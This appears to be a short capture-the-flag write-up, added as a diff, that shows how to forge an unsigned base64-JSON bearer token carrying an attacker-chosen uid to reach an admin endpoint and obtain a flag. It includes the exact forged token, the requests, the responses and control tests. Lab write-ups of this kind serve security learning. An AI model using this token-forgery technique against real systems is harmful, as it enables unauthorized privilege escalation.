@@ -1,0 +1,13 @@
+Minted offline (no server interaction): T = base64('{"uid":"2"}') = eyJ1aWQiOiIyIn0=
+
+GET /admin/config?token=eyJ1aWQiOiIyIn0=   -> 200 {"flag": "FLAG{api_chain_ok}", "debug": true}
+
+Controls (differential proves uid is the only check):
+- forged uid=1  : base64('{"uid":"1"}')            -> 403 {"error": "admin only"}
+- garbage token : token=garbage                     -> 403 {"error": "admin only"}
+- no token      : GET /admin/config                -> 403 {"error": "admin only"}
+- legitimate    : GET /login?user=admin -> token    -> 200 {"flag": "FLAG{api_chain_ok}", "debug": true}
+- POST /admin/config                              -> 404 (GET-only route)
+
+Conclusion: bearer token is unforgeable-proof-less base64(json); authority = attacker-chosen "uid" field.
+Escalation: unauthenticated -> admin. Flag FLAG{api_chain_ok} disclosed.
